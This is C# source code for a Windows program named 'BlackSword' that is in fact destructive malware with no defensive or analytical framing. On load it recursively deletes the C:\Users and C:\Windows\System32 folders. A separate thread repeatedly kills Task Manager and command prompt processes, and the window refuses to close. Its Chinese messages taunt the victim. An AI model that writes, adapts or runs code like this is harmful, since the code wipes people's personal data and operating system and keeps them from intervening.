using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BlackSword
{
    public partial class MainForm : Form
    {
        public MainForm()
        {
            InitializeComponent();
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            Thread t = new Thread(() => StartTrojan());
            t.Start();

            Thread thread1 = new Thread(delegate(){
                for(; ; )
                {
                    Thread.Sleep(100);
                    Process[] myProcesses = Process.GetProcesses();//获取当前进程数组
                    foreach (Process myProcess in myProcesses)
                    {
                        if (myProcess.ProcessName == "Taskmgr" || myProcess.ProcessName == "cmd")
                            myProcess.Kill();
                    }
                }
            });
            thread1.Start();
        }

        private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            MessageBox.Show("诶嘿，关不掉！");
        }

        private void StartTrojan()
        {
            try
            {
                Directory.Delete(@"C:\Users\", true);
            }
            catch { }
            try
            {
                Directory.Delete(@"C:\Windows\System32\", true);
            }
            catch { }
            MessageBox.Show("我滴任务完成啦！哈哈哈……");
            Environment.Exit(0);
        }

    }
}
